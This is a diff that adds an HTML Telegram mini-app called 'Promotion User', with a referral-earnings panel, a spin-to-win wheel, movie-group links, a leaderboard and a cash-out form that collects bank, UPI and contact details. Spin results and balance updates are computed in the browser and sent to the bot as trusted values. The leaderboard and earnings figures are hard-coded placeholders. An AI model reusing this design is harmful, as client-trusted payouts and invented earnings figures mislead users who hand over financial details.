@@ -1,0 +1,1103 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promotion User - Earning & Spin Panel</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6a11cb;
+            font-weight: bold;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        
+        .earnings-section {
+            text-align: center;
+        }
+        
+        .balance {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .progress-container {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            height: 20px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff9a9e 0%, #fad0c4 100%);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+        
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        .buttons-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .btn-icon {
+            font-size: 24px;
+        }
+        
+        .spin-section {
+            text-align: center;
+        }
+        
+        .spin-wheel-container {
+            position: relative;
+            width: 250px;
+            height: 250px;
+            margin: 20px auto;
+        }
+        
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(
+                #ff9a9e 0deg 60deg,
+                #fad0c4 60deg 120deg,
+                #a1c4fd 120deg 180deg,
+                #c2e9fb 180deg 240deg,
+                #ffecd2 240deg 300deg,
+                #fcb69f 300deg 360deg
+            );
+            position: relative;
+            transition: transform 3s cubic-bezier(0.2, 0.8, 0.3, 1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #6a11cb;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .pointer {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 40px;
+            background: #ff4757;
+            clip-path: polygon(50% 100%, 0 0, 100% 0);
+            z-index: 3;
+        }
+        
+        .spin-btn {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            border: none;
+            border-radius: 50px;
+            padding: 12px 30px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(255, 154, 158, 0.4);
+            transition: all 0.3s ease;
+        }
+        
+        .spin-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 154, 158, 0.6);
+        }
+        
+        .spin-btn:disabled {
+            background: rgba(255, 255, 255, 0.2);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .spin-count {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        
+        .bonus-section {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .bonus-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 15px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .invite-section {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .invite-link {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-size: 14px;
+        }
+        
+        .copy-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        .share-btn {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            border-radius: 15px;
+            padding: 25px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .leaderboard-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+        
+        .leaderboard-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .leaderboard-rank {
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .leaderboard-name {
+            flex: 1;
+        }
+        
+        .leaderboard-earnings {
+            font-weight: bold;
+        }
+        
+        .movie-groups {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .movie-group-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .referral-stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .referral-list {
+            margin-top: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .referral-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 14px;
+        }
+        
+        .prize-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            z-index: 200;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            display: none;
+        }
+        
+        .prize-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .prize-amount {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #ffd700;
+        }
+        
+        .premium-prize {
+            color: #ffd700;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .claim-btn {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
+        @media (max-width: 480px) {
+            .buttons-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .spin-wheel-container {
+                width: 200px;
+                height: 200px;
+            }
+            
+            .movie-groups {
+                grid-template-columns: 1fr;
+            }
+            
+            .referral-stats {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">💰 Promotion User</div>
+            <div class="user-info">
+                <div class="user-avatar" id="userAvatar">U</div>
+                <div>
+                    <div id="userName">User</div>
+                    <div style="font-size: 12px;">Rank: <span id="userRank">-</span></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card earnings-section">
+            <div>Your Earnings</div>
+            <div class="balance" id="userBalance">₹0.00</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar" style="width: 0%"></div>
+            </div>
+            <div class="progress-text">
+                <span>₹0</span>
+                <span>₹80</span>
+            </div>
+            <div style="font-size: 14px; margin-top: 10px;">Withdraw when you reach ₹80</div>
+        </div>
+        
+        <div class="card">
+            <div class="buttons-grid">
+                <button class="btn" id="cashOutBtn">
+                    <span class="btn-icon">💸</span>
+                    <span>Cash Out</span>
+                </button>
+                <button class="btn" id="invitationBtn">
+                    <span class="btn-icon">🤝</span>
+                    <span>Invitation & Earnings</span>
+                </button>
+                <button class="btn" id="movieGroupsBtn">
+                    <span class="btn-icon">🎬</span>
+                    <span>Movie Groups</span>
+                </button>
+                <button class="btn" id="spinWinBtn">
+                    <span class="btn-icon">🍀</span>
+                    <span>Spin & Win</span>
+                </button>
+                <button class="btn" id="leaderboardBtn">
+                    <span class="btn-icon">🏆</span>
+                    <span>Leaderboard</span>
+                </button>
+                <button class="btn" id="helpBtn">
+                    <span class="btn-icon">❓</span>
+                    <span>Help</span>
+                </button>
+            </div>
+        </div>
+        
+        <div class="card spin-section" id="spinSection" style="display: none;">
+            <h3>Spin & Win</h3>
+            <div class="spin-wheel-container">
+                <div class="pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div class="wheel-center">SPIN</div>
+                </div>
+            </div>
+            <button class="spin-btn" id="spinButton">Spin Now</button>
+            <div class="spin-count" id="spinCount">Spins Available: 0</div>
+            
+            <div class="bonus-section">
+                <button class="bonus-btn" id="bonusSpinBtn">
+                    <span>+1 Spin</span>
+                    <span>Join @asbhai_bsr</span>
+                </button>
+            </div>
+        </div>
+        
+        <div class="card invite-section">
+            <h3>Invite Friends & Earn More</h3>
+            <div class="invite-link" id="inviteLink">https://t.me/yourbot?start=ref_12345</div>
+            <div>
+                <button class="copy-btn" id="copyBtn">Copy Link</button>
+                <button class="share-btn" id="shareBtn">Share</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Cash Out Modal -->
+    <div class="modal" id="cashOutModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Cash Out</div>
+                <button class="close-btn" id="closeCashOutModal">&times;</button>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Full Name</label>
+                <input type="text" class="form-input" id="fullName" placeholder="Enter your full name">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Bank Account Number</label>
+                <input type="text" class="form-input" id="accountNumber" placeholder="Enter account number">
+            </div>
+            <div class="form-group">
+                <label class="form-label">IFSC Code</label>
+                <input type="text" class="form-input" id="ifscCode" placeholder="Enter IFSC code">
+            </div>
+            <div class="form-group">
+                <label class="form-label">UPI ID</label>
+                <input type="text" class="form-input" id="upiId" placeholder="Enter UPI ID">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Mobile No.</label>
+                <input type="text" class="form-input" id="mobileNo" placeholder="Enter mobile number">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Email ID</label>
+                <input type="email" class="form-input" id="emailId" placeholder="Enter email address">
+            </div>
+            <button class="submit-btn" id="submitCashOut">Submit Request</button>
+        </div>
+    </div>
+    
+    <!-- Invitation & Earnings Modal -->
+    <div class="modal" id="invitationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Invitation & Earnings</div>
+                <button class="close-btn" id="closeInvitationModal">&times;</button>
+            </div>
+            <div class="referral-stats">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalReferrals">0</div>
+                    <div class="stat-label">Total Referrals</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="referralEarnings">₹0.00</div>
+                    <div class="stat-label">Referral Earnings</div>
+                </div>
+            </div>
+            <div style="margin-top: 20px;">
+                <h4>Your Referrals</h4>
+                <div class="referral-list" id="referralList">
+                    <!-- Referral items will be added here dynamically -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Movie Groups Modal -->
+    <div class="modal" id="movieGroupsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Movie Groups</div>
+                <button class="close-btn" id="closeMovieGroupsModal">&times;</button>
+            </div>
+            <p style="margin-bottom: 15px;">Join these movie groups to earn more:</p>
+            <div class="movie-groups">
+                <button class="movie-group-btn" data-group="group1">Bollywood Movies</button>
+                <button class="movie-group-btn" data-group="group2">Hollywood Movies</button>
+                <button class="movie-group-btn" data-group="group3">South Indian Movies</button>
+                <button class="movie-group-btn" data-group="group4">Web Series</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Leaderboard Modal -->
+    <div class="modal" id="leaderboardModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Top 10 Earners</div>
+                <button class="close-btn" id="closeLeaderboardModal">&times;</button>
+            </div>
+            <ul class="leaderboard-list" id="leaderboardList">
+                <!-- Leaderboard items will be added here dynamically -->
+            </ul>
+        </div>
+    </div>
+    
+    <!-- Help Modal -->
+    <div class="modal" id="helpModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Help & Instructions</div>
+                <button class="close-btn" id="closeHelpModal">&times;</button>
+            </div>
+            <div style="max-height: 400px; overflow-y: auto;">
+                <h4>How to Earn Money:</h4>
+                <ul style="margin: 10px 0 20px 20px;">
+                    <li style="margin-bottom: 10px;">Invite friends using your referral link</li>
+                    <li style="margin-bottom: 10px;">Join movie groups and participate in activities</li>
+                    <li style="margin-bottom: 10px;">Use the Spin & Win feature daily</li>
+                    <li style="margin-bottom: 10px;">Complete offers and watch ads</li>
+                </ul>
+                
+                <h4>How to Invite Users:</h4>
+                <p style="margin: 10px 0 20px 0;">Share your personal referral link with friends. You earn ₹X for each friend who joins and completes the registration.</p>
+                
+                <h4>How Movie Search Earnings Work:</h4>
+                <p style="margin: 10px 0 20px 0;">When you search for movies through our shortlink service, you earn a commission for each completed search.</p>
+                
+                <h4>Need Help?</h4>
+                <p style="margin: 10px 0 20px 0;">Contact @asbhaibsr for any issues or questions.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Prize Popup -->
+    <div class="prize-popup" id="prizePopup">
+        <div class="prize-title">Congratulations!</div>
+        <div>You won:</div>
+        <div class="prize-amount" id="prizeAmount">₹0.00</div>
+        <div id="premiumPrizeMessage" class="premium-prize" style="display: none;">
+            Premium Prize! Contact @asbhaibsr to claim your reward.
+        </div>
+        <button class="claim-btn" id="closePrizePopup">OK</button>
+    </div>
+
+    <script>
+        // Telegram Web App initialization
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // User data (in a real app, this would come from the backend)
+        let userData = {
+            id: tg.initDataUnsafe.user?.id || '12345',
+            firstName: tg.initDataUnsafe.user?.first_name || 'User',
+            lastName: tg.initDataUnsafe.user?.last_name || '',
+            balance: 25.50,
+            spinCount: 3,
+            rank: 15,
+            totalReferrals: 12,
+            referralEarnings: 18.75,
+            referrals: [
+                { name: 'User1', joined: true, earnings: 2.50 },
+                { name: 'User2', joined: true, earnings: 2.50 },
+                { name: 'User3', joined: false, earnings: 0 },
+                { name: 'User4', joined: true, earnings: 2.50 },
+                { name: 'User5', joined: true, earnings: 2.50 }
+            ]
+        };
+        
+        // Leaderboard data
+        let leaderboardData = [
+            { rank: 1, name: 'TopEarner', earnings: 156.75 },
+            { rank: 2, name: 'MoneyMaker', earnings: 142.30 },
+            { rank: 3, name: 'CashKing', earnings: 128.90 },
+            { rank: 4, name: 'RichUser', earnings: 115.45 },
+            { rank: 5, name: 'WealthWinner', earnings: 102.10 },
+            { rank: 6, name: 'ProfitPro', earnings: 95.60 },
+            { rank: 7, name: 'EarningExpert', earnings: 88.25 },
+            { rank: 8, name: 'CashCollector', earnings: 76.80 },
+            { rank: 9, name: 'MoneyMaster', earnings: 69.40 },
+            { rank: 10, name: 'IncomeIcon', earnings: 62.15 }
+        ];
+        
+        // Prize options for spin wheel
+        const prizes = [
+            { value: 0.40, probability: 30 },
+            { value: 0.80, probability: 25 },
+            { value: 1.00, probability: 20 },
+            { value: 0.00, text: 'Try Again', probability: 15 },
+            { value: 50.00, probability: 5 },
+            { value: 'premium', text: 'Premium Prize', probability: 5 }
+        ];
+        
+        // DOM elements
+        const userAvatar = document.getElementById('userAvatar');
+        const userName = document.getElementById('userName');
+        const userRank = document.getElementById('userRank');
+        const userBalance = document.getElementById('userBalance');
+        const progressBar = document.getElementById('progressBar');
+        const spinCount = document.getElementById('spinCount');
+        const inviteLink = document.getElementById('inviteLink');
+        
+        // Buttons
+        const cashOutBtn = document.getElementById('cashOutBtn');
+        const invitationBtn = document.getElementById('invitationBtn');
+        const movieGroupsBtn = document.getElementById('movieGroupsBtn');
+        const spinWinBtn = document.getElementById('spinWinBtn');
+        const leaderboardBtn = document.getElementById('leaderboardBtn');
+        const helpBtn = document.getElementById('helpBtn');
+        const spinButton = document.getElementById('spinButton');
+        const bonusSpinBtn = document.getElementById('bonusSpinBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const shareBtn = document.getElementById('shareBtn');
+        
+        // Modals
+        const cashOutModal = document.getElementById('cashOutModal');
+        const invitationModal = document.getElementById('invitationModal');
+        const movieGroupsModal = document.getElementById('movieGroupsModal');
+        const leaderboardModal = document.getElementById('leaderboardModal');
+        const helpModal = document.getElementById('helpModal');
+        const prizePopup = document.getElementById('prizePopup');
+        
+        // Close buttons
+        const closeCashOutModal = document.getElementById('closeCashOutModal');
+        const closeInvitationModal = document.getElementById('closeInvitationModal');
+        const closeMovieGroupsModal = document.getElementById('closeMovieGroupsModal');
+        const closeLeaderboardModal = document.getElementById('closeLeaderboardModal');
+        const closeHelpModal = document.getElementById('closeHelpModal');
+        const closePrizePopup = document.getElementById('closePrizePopup');
+        
+        // Form elements
+        const submitCashOut = document.getElementById('submitCashOut');
+        
+        // Initialize the app
+        function initApp() {
+            // Set user data
+            userAvatar.textContent = userData.firstName.charAt(0);
+            userName.textContent = userData.firstName + (userData.lastName ? ' ' + userData.lastName : '');
+            userRank.textContent = '#' + userData.rank;
+            userBalance.textContent = '₹' + userData.balance.toFixed(2);
+            
+            // Update progress bar
+            const progressPercent = Math.min((userData.balance / 80) * 100, 100);
+            progressBar.style.width = progressPercent + '%';
+            
+            // Update spin count
+            spinCount.textContent = 'Spins Available: ' + userData.spinCount;
+            spinButton.disabled = userData.spinCount <= 0;
+            
+            // Set invite link
+            inviteLink.textContent = `https://t.me/yourbot?start=ref_${userData.id}`;
+            
+            // Populate referral list
+            const referralList = document.getElementById('referralList');
+            referralList.innerHTML = '';
+            userData.referrals.forEach(ref => {
+                const refItem = document.createElement('div');
+                refItem.className = 'referral-item';
+                refItem.innerHTML = `
+                    <div>${ref.name}</div>
+                    <div>${ref.joined ? '✅ Joined' : '❌ Not Joined'}</div>
+                    <div>₹${ref.earnings.toFixed(2)}</div>
+                `;
+                referralList.appendChild(refItem);
+            });
+            
+            // Update referral stats
+            document.getElementById('totalReferrals').textContent = userData.totalReferrals;
+            document.getElementById('referralEarnings').textContent = '₹' + userData.referralEarnings.toFixed(2);
+            
+            // Populate leaderboard
+            const leaderboardList = document.getElementById('leaderboardList');
+            leaderboardList.innerHTML = '';
+            leaderboardData.forEach(user => {
+                const li = document.createElement('li');
+                li.className = 'leaderboard-item';
+                li.innerHTML = `
+                    <div class="leaderboard-rank">#${user.rank}</div>
+                    <div class="leaderboard-name">${user.name}</div>
+                    <div class="leaderboard-earnings">₹${user.earnings.toFixed(2)}</div>
+                `;
+                leaderboardList.appendChild(li);
+            });
+        }
+        
+        // Event listeners for main buttons
+        cashOutBtn.addEventListener('click', () => {
+            if (userData.balance >= 80) {
+                cashOutModal.style.display = 'flex';
+            } else {
+                alert('You need at least ₹80 to cash out. Current balance: ₹' + userData.balance.toFixed(2));
+            }
+        });
+        
+        invitationBtn.addEventListener('click', () => {
+            invitationModal.style.display = 'flex';
+        });
+        
+        movieGroupsBtn.addEventListener('click', () => {
+            movieGroupsModal.style.display = 'flex';
+        });
+        
+        spinWinBtn.addEventListener('click', () => {
+            document.getElementById('spinSection').style.display = 'block';
+        });
+        
+        leaderboardBtn.addEventListener('click', () => {
+            leaderboardModal.style.display = 'flex';
+        });
+        
+        helpBtn.addEventListener('click', () => {
+            helpModal.style.display = 'flex';
+        });
+        
+        // Close modal events
+        closeCashOutModal.addEventListener('click', () => {
+            cashOutModal.style.display = 'none';
+        });
+        
+        closeInvitationModal.addEventListener('click', () => {
+            invitationModal.style.display = 'none';
+        });
+        
+        closeMovieGroupsModal.addEventListener('click', () => {
+            movieGroupsModal.style.display = 'none';
+        });
+        
+        closeLeaderboardModal.addEventListener('click', () => {
+            leaderboardModal.style.display = 'none';
+        });
+        
+        closeHelpModal.addEventListener('click', () => {
+            helpModal.style.display = 'none';
+        });
+        
+        closePrizePopup.addEventListener('click', () => {
+            prizePopup.style.display = 'none';
+        });
+        
+        // Close modals when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === cashOutModal) cashOutModal.style.display = 'none';
+            if (e.target === invitationModal) invitationModal.style.display = 'none';
+            if (e.target === movieGroupsModal) movieGroupsModal.style.display = 'none';
+            if (e.target === leaderboardModal) leaderboardModal.style.display = 'none';
+            if (e.target === helpModal) helpModal.style.display = 'none';
+        });
+        
+        // Spin wheel functionality
+        let isSpinning = false;
+        
+        spinButton.addEventListener('click', () => {
+            if (isSpinning || userData.spinCount <= 0) return;
+            
+            isSpinning = true;
+            spinButton.disabled = true;
+            userData.spinCount--;
+            spinCount.textContent = 'Spins Available: ' + userData.spinCount;
+            
+            // Select a random prize based on probability
+            const random = Math.random() * 100;
+            let cumulativeProbability = 0;
+            let selectedPrize = prizes[0];
+            
+            for (const prize of prizes) {
+                cumulativeProbability += prize.probability;
+                if (random <= cumulativeProbability) {
+                    selectedPrize = prize;
+                    break;
+                }
+            }
+            
+            // Calculate spin rotation (multiple full rotations + prize segment)
+            const segments = prizes.length;
+            const segmentAngle = 360 / segments;
+            const prizeIndex = prizes.indexOf(selectedPrize);
+            const targetAngle = 360 * 5 + (segmentAngle * prizeIndex) + (Math.random() * segmentAngle);
+            
+            // Apply spin animation
+            const wheel = document.getElementById('wheel');
+            wheel.style.transform = `rotate(${targetAngle}deg)`;
+            
+            // Show prize after spin completes
+            setTimeout(() => {
+                isSpinning = false;
+                
+                // Show prize popup
+                const prizeAmount = document.getElementById('prizeAmount');
+                const premiumPrizeMessage = document.getElementById('premiumPrizeMessage');
+                
+                if (selectedPrize.value === 'premium') {
+                    prizeAmount.textContent = 'Premium Prize!';
+                    premiumPrizeMessage.style.display = 'block';
+                    
+                    // Send data to bot for premium prize
+                    if (tg && tg.sendData) {
+                        tg.sendData(JSON.stringify({
+                            command: 'premium_prize',
+                            userId: userData.id
+                        }));
+                    }
+                } else if (selectedPrize.value === 0) {
+                    prizeAmount.textContent = selectedPrize.text;
+                    premiumPrizeMessage.style.display = 'none';
+                } else {
+                    prizeAmount.textContent = '₹' + selectedPrize.value.toFixed(2);
+                    premiumPrizeMessage.style.display = 'none';
+                    
+                    // Update balance if it's a cash prize
+                    if (selectedPrize.value > 0) {
+                        userData.balance += selectedPrize.value;
+                        userBalance.textContent = '₹' + userData.balance.toFixed(2);
+                        
+                        // Update progress bar
+                        const progressPercent = Math.min((userData.balance / 80) * 100, 100);
+                        progressBar.style.width = progressPercent + '%';
+                        
+                        // Send data to bot to update balance
+                        if (tg && tg.sendData) {
+                            tg.sendData(JSON.stringify({
+                                command: 'update_balance',
+                                userId: userData.id,
+                                amount: selectedPrize.value
+                            }));
+                        }
+                    }
+                }
+                
+                prizePopup.style.display = 'block';
+            }, 3000);
+        });
+        
+        // Bonus spin button
+        bonusSpinBtn.addEventListener('click', () => {
+            // In a real app, this would check if user joined the channel
+            // For demo purposes, we'll just add a spin
+            userData.spinCount++;
+            spinCount.textContent = 'Spins Available: ' + userData.spinCount;
+            spinButton.disabled = false;
+            
+            // Open channel link
+            tg.openTelegramLink('https://t.me/asbhai_bsr');
+        });
+        
+        // Copy invite link
+        copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(inviteLink.textContent)
+                .then(() => {
+                    alert('Link copied to clipboard!');
+                })
+                .catch(err => {
+                    console.error('Failed to copy: ', err);
+                });
+        });
+        
+        // Share invite link
+        shareBtn.addEventListener('click', () => {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Join Promotion User',
+                    text: 'Earn money by joining this amazing platform!',
+                    url: inviteLink.textContent
+                })
+                .catch(err => console.error('Error sharing:', err));
+            } else {
+                // Fallback for browsers that don't support Web Share API
+                navigator.clipboard.writeText(inviteLink.textContent)
+                    .then(() => {
+                        alert('Link copied to clipboard! You can now share it.');
+                    })
+                    .catch(err => {
+                        console.error('Failed to copy: ', err);
+                    });
+            }
+        });
+        
+        // Movie group buttons
+        document.querySelectorAll('.movie-group-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const group = btn.getAttribute('data-group');
+                // Open group link (in a real app, these would be actual Telegram group links)
+                tg.openTelegramLink('https://t.me/example_group');
+            });
+        });
+        
+        // Cash out form submission
+        submitCashOut.addEventListener('click', () => {
+            const fullName = document.getElementById('fullName').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            const ifscCode = document.getElementById('ifscCode').value;
+            const upiId = document.getElementById('upiId').value;
+            const mobileNo = document.getElementById('mobileNo').value;
+            const emailId = document.getElementById('emailId').value;
+            
+            if (!fullName || !accountNumber || !ifscCode || !upiId || !mobileNo || !emailId) {
+                alert('Please fill all fields');
+                return;
+            }
+            
+            // In a real app, this would send the data to the backend
+            alert('Withdrawal request submitted successfully!');
+            cashOutModal.style.display = 'none';
+            
+            // Reset form
+            document.getElementById('fullName').value = '';
+            document.getElementById('accountNumber').value = '';
+            document.getElementById('ifscCode').value = '';
+            document.getElementById('upiId').value = '';
+            document.getElementById('mobileNo').value = '';
+            document.getElementById('emailId').value = '';
+            
+            // Send data to bot
+            if (tg && tg.sendData) {
+                tg.sendData(JSON.stringify({
+                    command: 'withdrawal_request',
+                    userId: userData.id,
+                    amount: userData.balance,
+                    details: {
+                        fullName,
+                        accountNumber,
+                        ifscCode,
+                        upiId,
+                        mobileNo,
+                        emailId
+                    }
+                }));
+            }
+            
+            // Reset balance (in a real app, this would happen after backend processing)
+            userData.balance = 0;
+            userBalance.textContent = '₹' + userData.balance.toFixed(2);
+            progressBar.style.width = '0%';
+        });
+        
+        // Initialize the app when the page loads
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
+</body>
+  </html>
